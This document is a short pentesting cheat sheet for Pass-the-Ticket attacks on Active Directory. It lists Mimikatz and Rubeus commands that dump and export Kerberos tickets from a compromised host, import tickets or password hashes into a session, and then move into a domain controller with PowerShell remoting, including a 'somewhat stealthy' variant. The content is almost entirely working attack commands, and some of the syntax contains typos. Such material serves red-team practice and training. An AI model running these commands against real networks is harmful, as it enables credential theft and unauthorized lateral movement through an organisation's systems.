-- -
PtT attack from a windows host. Usually for #AD pentesting. 
### Get a ticket
The first step is to get a valid TGT or TGS ticket to pass around. In order to do this, you will need local admin privs on the compromised host. 
#### Mimikatz
```powershell
mimikatz.exe
privilege::debug
sekurlsa::tickets /export 
exit
dir *.kirbi # you should see one or more kirbi files
```
*Note: computer accounts end with a $ symbol, while user tickets have the username@service-domain.local.kirbi*
#### Rubeus
```powershell
# will dump out tickets to stdout
Rubeus.exe dump /nowrap
```
### Pass the Ticket
#### Rubeus
```bash
# Asks for a ticket then imports ticket to current session
# use raw hash
Rubeus.exe asktgt /domain:<domain> /user:<user> /rc4:<hash> /ptt

# use kirbi file
Rubeus.exe ptt /ticker:<path to kirbi file> 

# user base64 encoded hash
Rubeus.exe ptt /ticker:<base64 str>
```

Remote into another machine afterwards, somewhat stealthily
```bash
# open sacrificial shell
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show 

# Pass the Ticket
Rubeus.exe asktgt /user:<user> /domain:<domain> /aes256:<hash> /ptt

# remote into another machine
powershell
Enter-PSSession -ComputerName DC01
```
#### mimikatz
```bash
mimikatz.exe
privilege::debug
kerberos::ptt "<path to kirbi file>"

# get shell by exiting mimikatz 
exit

# or by opening a new cmd prompt w/ ticket imported to it
misc::cmd
```

Remote into another machine afterwards
```bash
mimikatz.exe
privilege::debug 
kerberos::ptt "<path to kirbi file>"
exit
powershell
Enter-PSSession -ComputerName DC01
```